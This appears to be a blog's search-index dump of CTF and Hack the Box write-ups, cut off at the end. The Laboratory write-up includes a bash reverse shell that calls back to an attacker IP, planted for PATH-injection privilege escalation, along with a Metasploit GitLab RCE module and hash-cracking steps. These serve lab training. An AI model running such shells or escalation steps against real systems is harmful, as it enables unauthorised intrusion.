[{"categories":["write-ups"],"content":"Hack the Box Delivery Write-up","date":"2021-06-13","objectID":"/delivery/","tags":["Linux","Web","Hashcat","HTB"],"title":"Hack the Box - Delivery","uri":"/delivery/"},{"categories":["write-ups"],"content":"Write-up of Delivery - Difficulty : Medium \" As always we start with nmap… but it can take a while so I’ve already ran it.” ippsec ","date":"2021-06-13","objectID":"/delivery/:0:0","tags":["Linux","Web","Hashcat","HTB"],"title":"Hack the Box - Delivery","uri":"/delivery/"},{"categories":["write-ups"],"content":"1. Overview Delivery consists of a poorly configured Linux box that has plenty of passwords left lying around by the system administrators. Poor password re-use policies allow escalation to root. ","date":"2021-06-13","objectID":"/delivery/:1:0","tags":["Linux","Web","Hashcat","HTB"],"title":"Hack the Box - Delivery","uri":"/delivery/"},{"categories":["write-ups"],"content":"2. Recon ","date":"2021-06-13","objectID":"/delivery/:2:0","tags":["Linux","Web","Hashcat","HTB"],"title":"Hack the Box - Delivery","uri":"/delivery/"},{"categories":["write-ups"],"content":"2.1 Nmap We start off running a port scan with nmap and we see that ports 22 and 80 are open. nmap -sC -sV 10.129.160.111 --min-rate 10000 ","date":"2021-06-13","objectID":"/delivery/:2:1","tags":["Linux","Web","Hashcat","HTB"],"title":"Hack the Box - Delivery","uri":"/delivery/"},{"categories":["write-ups"],"content":"2.2 Website 2.2.1 Delivery The first thing we do is check out the web page running on port 80. There’s not much going on here except a link to the helpdesk and the company’s MatterMost server. The website tells us that we’ll need a @delivery.htb email address to access the MatterMost server. When clicking the links we get routed to helpdesk.delivery.htb and delivery.htb:8056. We can add both entries to our /etc/hosts/ file so they resolve properly. 2.2.2 Mattermost The registration process for the MatterMost server requires us to click the registration link that gets emailed to whatever address we put in. Since we’re on a lab environment we clearly can’t get access to that email. 2.2.3 Helpdesk Just a basic helpdesk site. Nothing out of the ordinary when clicking around. ","date":"2021-06-13","objectID":"/delivery/:2:2","tags":["Linux","Web","Hashcat","HTB"],"title":"Hack the Box - Delivery","uri":"/delivery/"},{"categories":["write-ups"],"content":"3. Foothold If we create a ticket on the helpdesk site it will give us our ticket number as well as an email address that we can send emails to if we want to update the ticket. Anything sent to this address will be added to the ticket. We can take that email address and attempt to use it to register to the MatterMost server since that registration link should show up in our ticket if an email is actually being sent. If we copy and paste that link it should allow us to verify our email address for server. When we first login we are able to join the default chat room for the company. Looks like someone left a few messages that give quite a bit more info than they should be giving out. Someone left the credentials to the server, maildeliverer:Youve_G0t_Mail!, as well as a hint that the admins appear to be re-using credentials and variations of “PleaseSubscribe!\". We can use the maildeliverer credentials to ssh into the box. This user can grab the user flag from their home directory. ","date":"2021-06-13","objectID":"/delivery/:3:0","tags":["Linux","Web","Hashcat","HTB"],"title":"Hack the Box - Delivery","uri":"/delivery/"},{"categories":["write-ups"],"content":"4. Privilege Escalation After some manual enumeration of the box we find some configuration files for the MatterMost server in /opt/mattermost/config. In that file we find another username and password, this time for the mattermost sql database. Now we can just login to the local mysql server using our new credentials and see what we can find. Now that we’re logged in we can run basic mysql commands. We find a Users table and we’re able to grab username and hashes from that same table. show tables; select username, password from Users; Bring that hash over to hashcat along with our hint of the admins using variations of “PleaseSubscribe!” and we should be able to crack it with the help of the OneRuleToRuleThemAll, which will take our password and tell hashcat to generate a wordlist with common variations. It finds the correct password and we’re able to switch users to root and grab the flag. ","date":"2021-06-13","objectID":"/delivery/:4:0","tags":["Linux","Web","Hashcat","HTB"],"title":"Hack the Box - Delivery","uri":"/delivery/"},{"categories":["write-ups"],"content":"Conclusion Don’t leave confidential things lying around in places where anyone can find it. Ensure that your registration process for company assets is not easily circumvented in the name of convenience. The helpdesk could easily require you to login to update your ticket as opposed to providing an email on the domain which the MatterMost server requires for registration. If this write-up was helpful consider leaving some respect on my HTB profile.","date":"2021-06-13","objectID":"/delivery/:5:0","tags":["Linux","Web","Hashcat","HTB"],"title":"Hack the Box - Delivery","uri":"/delivery/"},{"categories":["write-ups"],"content":"S.H.E.L.L CTF","date":"2021-06-10","objectID":"/shell/","tags":["stego","zsteg"],"title":"S.H.E.L.L. CTF - Challenges","uri":"/shell/"},{"categories":["write-ups"],"content":"SHELL CTF Forensic Challenges ","date":"2021-06-10","objectID":"/shell/:0:0","tags":["stego","zsteg"],"title":"S.H.E.L.L. CTF - Challenges","uri":"/shell/"},{"categories":["write-ups"],"content":"1. Cold Compress Not much going on in this one. Download the image file you’re given and run binwalk against it to extract the embedded executable. I pulled the file up in Ghidra to see that all it does is print out the flag. ","date":"2021-06-10","objectID":"/shell/:1:0","tags":["stego","zsteg"],"title":"S.H.E.L.L. CTF - Challenges","uri":"/shell/"},{"categories":["write-ups"],"content":"2. Grass Is Green This one is simple as well. Open the image in an editing program such as GIMP and raise the brightness until you can see the flag. ","date":"2021-06-10","objectID":"/shell/:2:0","tags":["stego","zsteg"],"title":"S.H.E.L.L. CTF - Challenges","uri":"/shell/"},{"categories":["write-ups"],"content":"3. Hidden Inside 1, 2 and 3 I forgot to screen shot the challenge info for all the Hidden challenges but they’re all basically the same. The file is just modified for each challenge. For Hidden 1 change the extension to .png to view the file. You can just run zsteg against it to find the flag. Hidden 2 is also a png file with the wrong extension. You can run zteg again but this time it finds a hidden png file within the image. zsteg -E b1,g,lsb,xy hidden2.png \u003e file.png Hidden 3 is an a jpeg file which we can utilize JPEG Hide and Seek on to extract the hidden file. There was a hint on the challenge that gave the year a program was created which made finding the JPHS program easier to find. ","date":"2021-06-10","objectID":"/shell/:3:0","tags":["stego","zsteg"],"title":"S.H.E.L.L. CTF - Challenges","uri":"/shell/"},{"categories":["CTF"],"content":"S.H.E.L.L. CTF 2021","date":"2021-06-10","objectID":"/ctf/shellctf/","tags":["CTF"],"title":"S.H.E.L.L CTF","uri":"/ctf/shellctf/"},{"categories":["CTF"],"content":" This past weekend I decided to play around in the SHELL CTF in between working on my capstone project. Didn’t have a ton of time but wanted to knock out some forensics challenges. Unfortunately, for whatever reason, forensics in this CTF was more stegonography challenges than anything else. Still fun though. Challenges ","date":"2021-06-10","objectID":"/ctf/shellctf/:0:0","tags":["CTF"],"title":"S.H.E.L.L CTF","uri":"/ctf/shellctf/"},{"categories":[""],"content":"S.H.E.L.L. CTF 2021","date":"2021-06-10","objectID":"/shellctf/","tags":[""],"title":"S.H.E.L.L CTF","uri":"/shellctf/"},{"categories":[""],"content":"This past weekend I decided to play around in the SHELL CTF in between working on my capstone project. Didn’t have a ton of time but wanted to knock out some forensics challenges. Unfortunately, for whatever reason, forensics in this CTF was more stegonography challenges than anything else. Still fun though. Challenges ","date":"2021-06-10","objectID":"/shellctf/:0:0","tags":[""],"title":"S.H.E.L.L CTF","uri":"/shellctf/"},{"categories":["CTF"],"content":"HeroCTF 2021","date":"2021-04-27","objectID":"/ctf/heroctf/","tags":["CTF"],"title":"HeroCTF 2021","uri":"/ctf/heroctf/"},{"categories":["CTF"],"content":" Not much of a break from the Hack the Box CTF. HeroCTF was pretty fun. Didn’t have much time to poke at the challenges due to the multiple DDOS attacks on their servers over the weekend but from what I’ve seen the organizers did a good job. Challenge Write-ups ","date":"2021-04-27","objectID":"/ctf/heroctf/:0:0","tags":["CTF"],"title":"HeroCTF 2021","uri":"/ctf/heroctf/"},{"categories":[""],"content":"HeroCTF 2021","date":"2021-04-27","objectID":"/heroctf/","tags":[""],"title":"HeroCTF 2021","uri":"/heroctf/"},{"categories":[""],"content":"Not much of a break from the Hack the Box CTF. HeroCTF was pretty fun. Didn’t have much time to poke at the challenges due to the multiple DDOS attacks on their servers over the weekend but from what I’ve seen the organizers did a good job. Challenge Write-ups ","date":"2021-04-27","objectID":"/heroctf/:0:0","tags":[""],"title":"HeroCTF 2021","uri":"/heroctf/"},{"categories":[""],"content":"HeroCTF 2021 - Challenges","date":"2021-04-26","objectID":"/heroctfchall/","tags":[""],"title":"HeroCTF 2021 - Challenges","uri":"/heroctfchall/"},{"categories":[""],"content":"OSINT ","date":"2021-04-26","objectID":"/heroctfchall/:1:0","tags":[""],"title":"HeroCTF 2021 - Challenges","uri":"/heroctfchall/"},{"categories":[""],"content":"Find Me Reverse image search the given file. One of the websites states that it is the Portes Mordelaises. ","date":"2021-04-26","objectID":"/heroctfchall/:1:1","tags":[""],"title":"HeroCTF 2021 - Challenges","uri":"/heroctfchall/"},{"categories":[""],"content":"Social ID #1 Head over to https://tweeterid.com and just put in the HeroCTF handle. ","date":"2021-04-26","objectID":"/heroctfchall/:1:2","tags":[""],"title":"HeroCTF 2021 - Challenges","uri":"/heroctfchall/"},{"categories":[""],"content":"Social ID #2 Head over to https://tweeterid.com again and just put in the ID instead. ","date":"2021-04-26","objectID":"/heroctfchall/:1:3","tags":[""],"title":"HeroCTF 2021 - Challenges","uri":"/heroctfchall/"},{"categories":[""],"content":"Transfer Look up the bitcoin transaction ID and find the wallet the transaction went to. ","date":"2021-04-26","objectID":"/heroctfchall/:1:4","tags":[""],"title":"HeroCTF 2021 - Challenges","uri":"/heroctfchall/"},{"categories":[""],"content":"ProtonDate Look up the email from within Proton Mail and it will show you when the RSA key was created. ","date":"2021-04-26","objectID":"/heroctfchall/:1:5","tags":[""],"title":"HeroCTF 2021 - Challenges","uri":"/heroctfchall/"},{"categories":[""],"content":"Pushhhh View the HeroCTF_v2 repository and grab the flag. ","date":"2021-04-26","objectID":"/heroctfchall/:1:6","tags":[""],"title":"HeroCTF 2021 - Challenges","uri":"/heroctfchall/"},{"categories":[""],"content":"Forensics ","date":"2021-04-26","objectID":"/heroctfchall/:2:0","tags":[""],"title":"HeroCTF 2021 - Challenges","uri":"/heroctfchall/"},{"categories":[""],"content":"We Need You 1 Use the volatility framework to parse through the downloadable memory dump. Use imageinfo to grab the system profile, then hivelist to view the place of the SYSTEM key, then printkey to grab the contents. ","date":"2021-04-26","objectID":"/heroctfchall/:2:1","tags":[""],"title":"HeroCTF 2021 - Challenges","uri":"/heroctfchall/"},{"categories":[""],"content":"We Need You 2 Grab the NTLM hash from the \\Config\\DEFAULT key and throw it to an NTLM hash site for the flag. ","date":"2021-04-26","objectID":"/heroctfchall/:2:2","tags":[""],"title":"HeroCTF 2021 - Challenges","uri":"/heroctfchall/"},{"categories":[""],"content":"We Need You 3 Use the netscan option to view any connections made to the machine. ","date":"2021-04-26","objectID":"/heroctfchall/:2:3","tags":[""],"title":"HeroCTF 2021 - Challenges","uri":"/heroctfchall/"},{"categories":[""],"content":"Other ","date":"2021-04-26","objectID":"/heroctfchall/:3:0","tags":[""],"title":"HeroCTF 2021 - Challenges","uri":"/heroctfchall/"},{"categories":[""],"content":"Russian Open all the zip files to get the flag. ","date":"2021-04-26","objectID":"/heroctfchall/:3:1","tags":[""],"title":"HeroCTF 2021 - Challenges","uri":"/heroctfchall/"},{"categories":[""],"content":"Holy Abbot Decode the file from Ave Maria cipher. ","date":"2021-04-26","objectID":"/heroctfchall/:3:2","tags":[""],"title":"HeroCTF 2021 - Challenges","uri":"/heroctfchall/"},{"categories":[""],"content":"Phono Download the PhonoPaper app and use it to listen to the downloadable file to hear the flag. ","date":"2021-04-26","objectID":"/heroctfchall/:3:3","tags":[""],"title":"HeroCTF 2021 - Challenges","uri":"/heroctfchall/"},{"categories":[""],"content":"Cyber Apocalypse 2021","date":"2021-04-24","objectID":"/hackpock/","tags":[""],"title":"Cyber Apocalypse 2021 - Challenges","uri":"/hackpock/"},{"categories":[""],"content":"AlienPhish Unzip the downloadable file and view the slide1.xml.rels file. Inside is a command with some of the text backwards. Flip the text and decode the base64 for the flag. ","date":"2021-04-24","objectID":"/hackpock/:1:0","tags":[""],"title":"Cyber Apocalypse 2021 - Challenges","uri":"/hackpock/"},{"categories":[""],"content":"Authenticator Open the downloadable file with Ghidra and look through the functions. In the check pin function is a string with a ^9. Take the string to CyberChef and XOR with a key of 9 to get the flag. ","date":"2021-04-24","objectID":"/hackpock/:2:0","tags":[""],"title":"Cyber Apocalypse 2021 - Challenges","uri":"/hackpock/"},{"categories":[""],"content":"BlitzProp View the website and intecept the traffic with Burp. A hint is given on the song names since AST is capitalized. Check out AST Injection for some more info. Insert a command to read the directory the flag is in an then read the flag itself once you have the name. ","date":"2021-04-24","objectID":"/hackpock/:3:0","tags":[""],"title":"Cyber Apocalypse 2021 - Challenges","uri":"/hackpock/"},{"categories":[""],"content":"CAAS Have the website request file:/flag to read the flag. ","date":"2021-04-24","objectID":"/hackpock/:4:0","tags":[""],"title":"Cyber Apocalypse 2021 - Challenges","uri":"/hackpock/"},{"categories":[""],"content":"MiniSTRYplace Viewing the downloadable file tells us that requests with ../ will be replaced with a space. Exploit the LFI vulnerability by putting …/./…/. before the file to read the flag. ","date":"2021-04-24","objectID":"/hackpock/:5:0","tags":[""],"title":"Cyber Apocalypse 2021 - Challenges","uri":"/hackpock/"},{"categories":["CTF"],"content":"Cyber Apocalypse 2021","date":"2021-04-24","objectID":"/ctf/hackpoc/","tags":["CTF"],"title":"Cyber Apocalypse 2021","uri":"/ctf/hackpoc/"},{"categories":["CTF"],"content":" This week our Cybersecurity Club took part in Hack the Box’s Cyber Apocalypse 2021 CTF. WGU Fowl Owls ended up placing 195/4740 teams. Below are the links to the write-ups for the individual challenges. Challenges ","date":"2021-04-24","objectID":"/ctf/hackpoc/:0:0","tags":["CTF"],"title":"Cyber Apocalypse 2021","uri":"/ctf/hackpoc/"},{"categories":[""],"content":"Cyber Apocalypse 2021","date":"2021-04-24","objectID":"/hackpoc/","tags":[""],"title":"Cyber Apocalypse 2021","uri":"/hackpoc/"},{"categories":[""],"content":" This week our Cybersecurity Club took part in Hack the Box’s Cyber Apocalypse 2021 CTF. WGU Fowl Owls ended up placing 195/4740 teams. Below are the links to the write-ups for the individual challenges. Challenges ","date":"2021-04-24","objectID":"/hackpoc/:0:0","tags":[""],"title":"Cyber Apocalypse 2021","uri":"/hackpoc/"},{"categories":["write-ups"],"content":"HackPack CTF 2021 write-ups","date":"2021-04-18","objectID":"/hackpack/","tags":["Linux","Web","Git","CVE","HTB"],"title":"HackPack CTF 2021 Write-Ups","uri":"/hackpack/"},{"categories":["write-ups"],"content":"HackPack CTF 2021 ","date":"2021-04-18","objectID":"/hackpack/:0:0","tags":["Linux","Web","Git","CVE","HTB"],"title":"HackPack CTF 2021 Write-Ups","uri":"/hackpack/"},{"categories":["write-ups"],"content":"Euler’s Identity MD5 = d8d540ae49aadd151b96feb4e0ff124f ::: e^ SHA1 = abb07ca45c9e7719e66e766b958d943f561b8de6::: ipi= SHA-256 = c037c03ee627047a85df540c42d59c6b6028841704a7c706feff584a997fd2a3 SHA1 =5d3c4e0314c88f970ab3877e983527cf64d86a53 MD5 =6bb61e3b7bce0931da574d19d1d82c88 Each hash can be found by googling known hash websites. flag{e^ipi=-1} ","date":"2021-04-18","objectID":"/hackpack/:1:0","tags":["Linux","Web","Git","CVE","HTB"],"title":"HackPack CTF 2021 Write-Ups","uri":"/hackpack/"},{"categories":["write-ups"],"content":"BF means best friend, right? Reading the file reveals text encoded in brainfuck. Decode it for the flag. ","date":"2021-04-18","objectID":"/hackpack/:2:0","tags":["Linux","Web","Git","CVE","HTB"],"title":"HackPack CTF 2021 Write-Ups","uri":"/hackpack/"},{"categories":["write-ups"],"content":"“N\"ot “G\"am\"I\"ng a\"N\"ymore in “X\"mas Open the site while running burp, change the debug option from zero to one, go the the file location listed in your browser. ","date":"2021-04-18","objectID":"/hackpack/:3:0","tags":["Linux","Web","Git","CVE","HTB"],"title":"HackPack CTF 2021 Write-Ups","uri":"/hackpack/"},{"categories":["write-ups"],"content":"Aurora Run exiftool on the downloaded file. ","date":"2021-04-18","objectID":"/hackpack/:4:0","tags":["Linux","Web","Git","CVE","HTB"],"title":"HackPack CTF 2021 Write-Ups","uri":"/hackpack/"},{"categories":["CTF"],"content":"HackPack CTF 2021","date":"2021-04-18","objectID":"/ctf/hackpack2021/","tags":["CTF","OSINT"],"title":"HackPack CTF 2021","uri":"/ctf/hackpack2021/"},{"categories":["CTF"],"content":" This weekend was the HackPack CTF for 2021. It turns out the time I set aside on Satuday didn’t amount too much since the CTF was from 1100EST Friday to 1100EST Saturday. The challenges I looked through were pretty fun and I was only able to complete a few in the time I had. Challenge Write-ups ","date":"2021-04-18","objectID":"/ctf/hackpack2021/:0:0","tags":["CTF","OSINT"],"title":"HackPack CTF 2021","uri":"/ctf/hackpack2021/"},{"categories":[""],"content":"HackPack CTF 2021","date":"2021-04-18","objectID":"/hackpack2021/","tags":[""],"title":"HackPack CTF 2021","uri":"/hackpack2021/"},{"categories":[""],"content":"This weekend was the HackPack CTF for 2021. It turns out the time I set aside on Satuday didn’t amount too much since the CTF was from 1100EST Friday to 1100EST Saturday. The challenges I looked through were pretty fun and I was only able to complete a few in the time I had. Challenge Write-ups ","date":"2021-04-18","objectID":"/hackpack2021/:0:0","tags":[""],"title":"HackPack CTF 2021","uri":"/hackpack2021/"},{"categories":["write-ups"],"content":"Hack the Box Laboratory Write-up","date":"2021-04-16","objectID":"/laboratory/","tags":["GitLab","CVE","PATH injection","HTB"],"title":"Hack the Box - Laboratory","uri":"/laboratory/"},{"categories":["write-ups"],"content":"Write-up of Laboratory - Difficulty : Easy Just do it -Shia Lebeouf ","date":"2021-04-16","objectID":"/laboratory/:0:0","tags":["GitLab","CVE","PATH injection","HTB"],"title":"Hack the Box - Laboratory","uri":"/laboratory/"},{"categories":["write-ups"],"content":"1. Overview Laboratory is a Linux box running a vulnerable version of GitLab. Utilizing a known vulnerability we can reset the admin password and gain access to a stored SSH key. An executable stored on the victim is vulnerable to PATH injection and can be used to gain root access. z ","date":"2021-04-16","objectID":"/laboratory/:1:0","tags":["GitLab","CVE","PATH injection","HTB"],"title":"Hack the Box - Laboratory","uri":"/laboratory/"},{"categories":["write-ups"],"content":"2. Recon ","date":"2021-04-16","objectID":"/laboratory/:2:0","tags":["GitLab","CVE","PATH injection","HTB"],"title":"Hack the Box - Laboratory","uri":"/laboratory/"},{"categories":["write-ups"],"content":"2.1 Nmap As always we start off running a port scan with nmap and we see that ports 22, 80, and 443 are open. nmap -sC -sV -T4 10.129.130.16 There’s a redirect on 443 leading to https://laboratory.htb ","date":"2021-04-16","objectID":"/laboratory/:2:1","tags":["GitLab","CVE","PATH injection","HTB"],"title":"Hack the Box - Laboratory","uri":"/laboratory/"},{"categories":["write-ups"],"content":"2.2 Websites 2.2.1 laboratory.htb We can’t get to the site by just browsing to the IP address so we’ll have to add it to our /etc/hosts/ file before browsing to https://laboratory.htb. We can see that there’s a certificate error. When we view the cert we can see an alternate name listed for git.laboratory.htb. Nothing else useful is on the site so we move over to git.laboratory.htb. 2.2.2 git.laboratory.htb As we poke around the GitLab site we find that we can register a user and login. The website only allows @laboratory.htb emails to be registered but doesn’t require any verifcation before it logs you in. When we get into GitLab the first thing is to check the version, which turns out to be GitLab Community Edition 12.8.1. After some googling we wind up at https://hackerone.com/reports/827052 which details a security vulnerability involving read access to system files. This vulnerability can be used to get RCE on the host. We need to get the contents of the secrets.yml file. To do so we make a two projects, create an issue in one project, and then move that issue over to the other project. That should make GitLab include the actual file we specify in an attachment on the issue. ","date":"2021-04-16","objectID":"/laboratory/:2:2","tags":["GitLab","CVE","PATH injection","HTB"],"title":"Hack the Box - Laboratory","uri":"/laboratory/"},{"categories":["write-ups"],"content":"3. Foothold For this part we’re going to cheat a little and use Metasploit since there’s a module available. If we use exploit/multi/http/gitlab_file_read_rce it should give use RCE on the box. After filling out all the options (and putting in the secret key we got from before) we can just run the exploit and get a shell as git. I believe the exploit is able to grab that secrets file itself but wasn’t working for me whenver I tried it. ","date":"2021-04-16","objectID":"/laboratory/:3:0","tags":["GitLab","CVE","PATH injection","HTB"],"title":"Hack the Box - Laboratory","uri":"/laboratory/"},{"categories":["write-ups"],"content":"4. User The user git has access to the gitlab-rails console so we’ll be able to reset the password for other users on GitLab. We find the necessary documentation at https://docs.gitlab.com/12.10/ee/security/reset_root_password.html. After performing all the necessary steps listed we can simply log in as the user Dexter. ","date":"2021-04-16","objectID":"/laboratory/:4:0","tags":["GitLab","CVE","PATH injection","HTB"],"title":"Hack the Box - Laboratory","uri":"/laboratory/"},{"categories":["write-ups"],"content":"5. Second User Back we go to the GitLab page to login as Dexter. We can see that he has a project called SecureDocker which for some reason has his private key uploaded in the repo. We can take that key and save it to a text file on our attack box. Using the key we can SSH over as Dexter and grab the user flag. chmod 600 FILE ssh -i FILE dexter@10.129.130.16 ##6. Root First thing we do is upload LinPEAS to the victim and run it. We host the file with python3 -m http.server and the grab it with our remote shell with wget http://10.10.14.124:8000/linpeas.sh. LinPEAS finds a file with the SUID bit set in /usr/local/bin Running that file doesn’t appear to do anything so we upload PSpy to see if it’s doing something in the background that we can’t see. When we run it again we can see that it’s running some commands, but it’s not using the absolute path of chmod which means that it’s most likely vulnerable to PATH injection. We make a file in /tmp named chmod and fill it with the following bash reverse shell. #!/bin/bash bash - \u003e\u0026 /dev/tcp/10.10.14.124/7233 0\u003e\u00261 After creating out file we need to make sure that docker-security will run our chmod command and not the system’s by adding /tmp to our PATH variable with PATH=/tmp:$PATH. We start out netcat listener and run docker-security to get our root shell and the root flag. ","date":"2021-04-16","objectID":"/laboratory/:5:0","tags":["GitLab","CVE","PATH injection","HTB"],"title":"Hack the Box - Laboratory","uri":"/laboratory/"},{"categories":["write-ups"],"content":"Conclusion Update software to ensure known vulnerabilites are mitigated. Don’t upload private keys to an easily accessible location. Ensure any scripting is utilizing absolute path for commands to prevent PATH injection vulnerabilites. If this write-up was helpful consider leaving some respect on my HTB profile.","date":"2021-04-16","objectID":"/laboratory/:6:0","tags":["GitLab","CVE","PATH injection","HTB"],"title":"Hack the Box - Laboratory","uri":"/laboratory/"},{"categories":[""],"content":"TraceLabs OSINT CTF","date":"2021-04-12","objectID":"/ctf/ritsecctf2021/","tags":[""],"title":"RITSEC CTF 2021","uri":"/ctf/ritsecctf2021/"},{"categories":[""],"content":" This weekend was the yearly RITSEC CTF so I decided to give it a shot. A team was required to sign up but you could register a team with only one player, which is what I did. The CTF took place from Friday to Sunday. Unfortunately I didn’t have any time on Sunday so a few of the challenges I though I could get done didn’t end up being completed. My “team” NULL + Void ended up placing 78th out of 723 teams that took place in the competition. Overall I realized I need to do quite a bit more work on my reversing and code work as well as stegonography. It was definitely a lot of a fun and I lost track of time while working. Ended up going to sleep around 4am on Saturday morning. Below are the links to the write-ups for the individual challenges. Forensic Challenges Intel Challenges Misc/Web/Crypo Challenges ","date":"2021-04-12","objectID":"/ctf/ritsecctf2021/:0:0","tags":[""],"title":"RITSEC CTF 2021","uri":"/ctf/ritsecctf2021/"},{"categories":["CTF"],"content":"RITSEC CTF 2021","date":"2021-04-12","objectID":"/ritsecctf2021/","tags":["CTF","Crypto","Web","OSINT","Forensics"],"title":"RITSEC CTF 2021","uri":"/ritsecctf2021/"},{"categories":["CTF"],"content":" This weekend was the yearly RITSEC CTF so I decided to give it a shot. A team was required to sign up but you could register a team with only one player, which is what I did. The CTF took place from Friday to Sunday. Unfortunately I didn’t have any time on Sunday so a few of the challenges I though I could get done didn’t end up being completed. My “team” NULL + Void ended up placing 78th out of 723 teams that took place in the competition. Overall I realized I need to do quite a bit more work on my reversing and code work as well as stegonography. It was definitely a lot of a fun and I lost track of time while working. Ended up going to sleep around 4am on Saturday morning. Below are the links to the write-ups for the individual challenges. Forensic Challenges Intel Challenges Misc/Web/Crypo Challenges ","date":"2021-04-12","objectID":"/ritsecctf2021/:0:0","tags":["CTF","Crypto","Web","OSINT","Forensics"],"title":"RITSEC CTF 2021","uri":"/ritsecctf2021/"},{"categories":["write-ups"],"content":"RITSEC CTF 2021 - Forensics","date":"2021-04-12","objectID":"/ritsec2021-forensics/","tags":[],"title":"RITSEC CTF 2021 - Forensics","uri":"/ritsec2021-forensics/"},{"categories":["write-ups"],"content":"RITSEC CTF 2021 - Forensics ","date":"2021-04-12","objectID":"/ritsec2021-forensics/:0:0","tags":[],"title":"RITSEC CTF 2021 - Forensics","uri":"/ritsec2021-forensics/"},{"categories":["write-ups"],"content":"1597 Clone the git repo that’s given and look at the revision history. One of the previous files contains the flag. ","date":"2021-04-12","objectID":"/ritsec2021-forensics/:1:0","tags":[],"title":"RITSEC CTF 2021 - Forensics","uri":"/ritsec2021-forensics/"},{"categories":["write-ups"],"content":"Inception CTF Dream 1 Open the zip file that you’re given. Open the text document and the first flag is just written backwards. ","date":"2021-04-12","objectID":"/ritsec2021-forensics/:2:0","tags":[],"title":"RITSEC CTF 2021 - Forensics","uri":"/ritsec2021-forensics/"},{"categories":["write-ups"],"content":"Inception CTF Dream 2 Open the next zip file using the password Dreamland from the previous step. Inside is a text document with a string of numbers which can be converted to ASCII characters to reveal the next flag. ","date":"2021-04-12","objectID":"/ritsec2021-forensics/:3:0","tags":[],"title":"RITSEC CTF 2021 - Forensics","uri":"/ritsec2021-forensics/"},{"categories":["write-ups"],"content":"Inception CTF Dream 3 Open the next zip file using WaterUnderTheBridge and inside is another text file. This string is base64 endcoded. Once you decode it it give you a string of hex values that can be converted to ASCII characters and give you the flag. ","date":"2021-04-12","objectID":"/ritsec2021-forensics/:4:0","tags":[],"title":"RITSEC CTF 2021 - Forensics","uri":"/ritsec2021-forensics/"},{"categories":["write-ups"],"content":"Inception CTF Dream 4 Open the next zip with F@!!ingElev@tor. Inside is an .hta file that when you inspect near the bottom you’ll find morse cord in white font that you’ll have to highlight to see. Decode that to get the flag. ","date":"2021-04-12","objectID":"/ritsec2021-forensics/:5:0","tags":[],"title":"RITSEC CTF 2021 - Forensics","uri":"/ritsec2021-forensics/"},{"categories":["write-ups"],"content":"PleaseClickAllTheThings 1 You’re given an Outlook .msg file with three different attachments. The first is an html with embedded javascript. Open the file with a code viewer and you can see a URL encoded string that will decode into html text. Near the bottom is a base64 string that can be decoded to get the flag. ","date":"2021-04-12","objectID":"/ritsec2021-forensics/:6:0","tags":[],"title":"RITSEC CTF 2021 - Forensics","uri":"/ritsec2021-forensics/"},{"categories":["write-ups"],"content":"PleaseClickAllTheThings 2 Take the given file and run oledump against it to view the macros. The flag is in A4. python3 oledump.py -s A4 ../GandCrab_Ursnif_RITSEC.docm ","date":"2021-04-12","objectID":"/ritsec2021-forensics/:7:0","tags":[],"title":"RITSEC CTF 2021 - Forensics","uri":"/ritsec2021-forensics/"},{"categories":["write-ups"],"content":"Parcel The file you download doesn’t have an extension but if you run a file command you can see it’s a gunzip archive. Add .gz to the end and unzip the file and you’ll find a text file of emails going back and forth between people. All files are base64 encoded with the longer files able to be converted into PNG images. Convert all the image files and rearrange them to see the flag. RS{Im_doing_a_v1rtual_puzzl3} ","date":"2021-04-12","objectID":"/ritsec2021-forensics/:8:0","tags":[],"title":"RITSEC CTF 2021 - Forensics","uri":"/ritsec2021-forensics/"},{"categories":["write-ups"],"content":"Blob Clone the git repo and view the revision list. Cat the git blob and get the flag. ","date":"2021-04-12","objectID":"/ritsec2021-forensics/:9:0","tags":[],"title":"RITSEC CTF 2021 - Forensics","uri":"/ritsec2021-forensics/"},{"categories":["write-ups"],"content":"RITSEC CTF 2021 - Intel","date":"2021-04-12","objectID":"/ritsec2021-intel/","tags":[],"title":"RITSEC CTF 2021 - Intel","uri":"/ritsec2021-intel/"},{"categories":["write-ups"],"content":"RITSEC CTF 2021 - Intel ","date":"2021-04-12","objectID":"/ritsec2021-intel/:0:0","tags":[],"title":"RITSEC CTF 2021 - Intel","uri":"/ritsec2021-intel/"},{"categories":["write-ups"],"content":"Finding Geno Just do a google search for Geno and Bridgewater and you’ll find his LinkedIn page. ","date":"2021-04-12","objectID":"/ritsec2021-intel/:1:0","tags":[],"title":"RITSEC CTF 2021 - Intel","uri":"/ritsec2021-intel/"},{"categories":["write-ups"],"content":"Data Breach Geno has his email publicly viewable on the about me portion of his LinkedIn profile. Google search for that email and you’ll wind up at a email/password dump site. ","date":"2021-04-12","objectID":"/ritsec2021-intel/:2:0","tags":[],"title":"RITSEC CTF 2021 - Intel","uri":"/ritsec2021-intel/"},{"categories":["write-ups"],"content":"Music Signs If you go to Geno’s twitter page you can see he only has a couple people following him. One of them is Claire Eng. Click the Spotify link on her Twitter page and the flag is the first letter of each song in her only playlist. ","date":"2021-04-12","objectID":"/ritsec2021-intel/:3:0","tags":[],"title":"RITSEC CTF 2021 - Intel","uri":"/ritsec2021-intel/"},{"categories":["write-ups"],"content":"OSINT Challenge Check the other employees of Bridgewater Investigations on LinkedIn and you’ll find the CEO is JoAnne Turner-Frey. Google her name or search it on Twitter and you can find her account easily. To find the park name I just googled her location from LinkedIn and peace park. The flag is the name of the park. ","date":"2021-04-12","objectID":"/ritsec2021-intel/:4:0","tags":[],"title":"RITSEC CTF 2021 - Intel","uri":"/ritsec2021-intel/"},{"categories":["write-ups"],"content":"APT Interference Claire’s Twitter page from the previous challenge had a bitcoin address in it. Put the address into blockchain.com and you’ll be able to see any recent transactions. She was recently paid by someone so we can take their bitcoin address and google it. We wind up at a website advertising the wallet for the government of Ackaria. ","date":"2021-04-12","objectID":"/ritsec2021-intel/:5:0","tags":[],"title":"RITSEC CTF 2021 - Intel","uri":"/ritsec2021-intel/"},{"categories":["write-ups"],"content":"RITSEC CTF 2021 - Misc/Web/Crypto","date":"2021-04-12","objectID":"/ritsec2021-misc/","tags":[],"title":"RITSEC CTF 2021 - Misc/Web/Crypto","uri":"/ritsec2021-misc/"},{"categories":["write-ups"],"content":"RITSEC CTF 2021 - Misc/Web/Crypto ","date":"2021-04-12","objectID":"/ritsec2021-misc/:0:0","tags":[],"title":"RITSEC CTF 2021 - Misc/Web/Crypto","uri":"/ritsec2021-misc/"},{"categories":["write-ups"],"content":"Robots Go to the website given and check the /robots.txt file. The flag is given in base64 encoding. ","date":"2021-04-12","objectID":"/ritsec2021-misc/:1:0","tags":[],"title":"RITSEC CTF 2021 - 